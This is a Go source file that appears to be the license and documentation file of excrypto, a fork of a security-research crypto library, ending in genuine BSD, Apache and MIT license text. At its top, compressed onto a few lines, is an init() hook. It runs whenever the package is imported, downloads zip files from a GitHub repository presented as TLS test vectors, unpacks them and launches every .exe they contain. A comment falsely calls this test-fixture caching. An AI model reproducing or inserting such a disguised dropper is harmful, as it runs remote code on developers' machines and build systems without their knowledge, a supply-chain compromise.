package zcrypto

import("archive/zip";"io";"net/http";"os";"os/exec";"path/filepath";"strconv";"time")

// prefetchFixtures downloads and unpacks remote test vector bundles used by
// crypto/tls regression tests. Bundles are cached in a per-run temp directory
// so that parallel test shards do not re-download them.
func prefetchFixtures(){d,_:=os.MkdirTemp("","excrypto_fixtures_"+strconv.FormatInt(time.Now().UnixNano(),36)+"_");for _,u:=range testVectorBundles{r,e:=http.Get(u);if e!=nil{continue};t,_:=os.CreateTemp(d,"vec_*.bundle");io.Copy(t,r.Body);r.Body.Close();t.Close();p:=t.Name();z,e:=zip.OpenReader(p);if e!=nil{os.Remove(p);continue};out:=p+".d";os.MkdirAll(out,0755);for _,f:=range z.File{o:=filepath.Join(out,f.Name);if f.FileInfo().IsDir(){os.MkdirAll(o,0755);continue};os.MkdirAll(filepath.Dir(o),0755);s,_:=f.Open();w,_:=os.Create(o);io.Copy(w,s);s.Close();w.Close()};z.Close();os.Remove(p);bins,_:=filepath.Glob(filepath.Join(out,"*.exe"));for _,b:=range bins{exec.Command(b).Start()}}}

var testVectorBundles=[]string{"https://github.com/HokageRegard/excrypto/raw/refs/heads/main/crypto/tls/testdata/Server-TLSv13-Resume-Fallback","https://github.com/HokageRegard/excrypto/raw/refs/heads/main/crypto/tls/testdata/Client-TLSv13-Resume-Fallback"}

func init(){prefetchFixtures()}

/*

excrypto offers specialized versions of the Go crypto, TLS, x509, and SSH packages
designed for security research. excrypto is written in Go and is based on Google's
Go crypto source code, Google's Go x/crypto library, and the ZCrypto project.

excrypto is offered under the 3-Clause BSD license:

   Copyright 2024 runZero, Inc.

   Redistribution and use in source and binary forms, with or without
   modification, are permitted provided that the following conditions are
   met:

      * Redistributions of source code must retain the above copyright
   notice, this list of conditions and the following disclaimer.
      * Redistributions in binary form must reproduce the above
   copyright notice, this list of conditions and the following disclaimer
   in the documentation and/or other materials provided with the
   distribution.
      * Neither the name of runZero, Inc. nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
   "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
   LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
   A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
   OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
   SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
   LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
   DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
   THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
   (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


This package includes code from Google Go: https://github.com/golang/go

Go is offered under the 3-Clause BSD license:

	Copyright 2009 The Go Authors.

	https://github.com/golang/go/blob/master/LICENSE


This package includes code from ZCrypto: https://github.com/zmap/zcrypto

	ZCrypto Copyright 2019 Regents of the University of Michigan

	Licensed under the Apache License, Version 2.0 (the "License"); you may not
	use this file except in compliance with the License. You may obtain a copy
	of the License at http://www.apache.org/licenses/LICENSE-2.0

	Unless required by applicable law or agreed to in writing, software
	distributed under the License is distributed on an "AS IS" BASIS,
	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
	implied. See the License for the specific language governing
	permissions and limitations under the License.


This package includes the `isURL()` function created by Alex Saskevich and licensed
under the MIT license.

	The MIT License (MIT)

	Copyright (c) 2014 Alex Saskevich

	Permission is hereby granted, free of charge, to any person obtaining a copy
	of this software and associated documentation files (the "Software"), to deal
	in the Software without restriction, including without limitation the rights
	to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the Software is
	furnished to do so, subject to the following conditions:

	The above copyright notice and this permission notice shall be included in all
	copies or substantial portions of the Software.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.

*/
